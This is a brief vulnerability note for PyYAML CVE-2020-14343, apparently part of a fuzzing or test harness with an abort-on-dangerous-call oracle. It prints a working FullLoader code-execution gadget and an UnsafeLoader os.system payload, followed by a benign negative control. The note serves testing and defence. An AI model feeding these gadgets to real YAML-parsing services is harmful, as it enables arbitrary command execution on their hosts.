CVE-2020-14343  (also relates to CVE-2020-1747)
PyYAML < 5.4 : yaml.load(..., Loader=FullLoader) allows arbitrary code
execution via object-construction gadgets. Fixed in 5.4 by restricting the
FullConstructor.

Reference public gadget (FullLoader RCE):

    !!python/object/new:type
      args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
      listitems: "__import__('os').system('id')"

Any input that makes yaml.load(..., FullLoader) reach exec / os.system /
subprocess / a dangerous import / an outbound socket / a sensitive file read
is a valid finding; the entry's audit-hook oracle aborts (SIGABRT) on it.

Trivial variant (only fires under Loader=yaml.UnsafeLoader -- use for oracle
smoke testing, NOT the FullLoader target):

    !!python/object/apply:os.system ["id"]

Negative control (must NOT abort under any loader):

    name: alice
    role: admin
    limits: {cpu: 2, mem: 512}
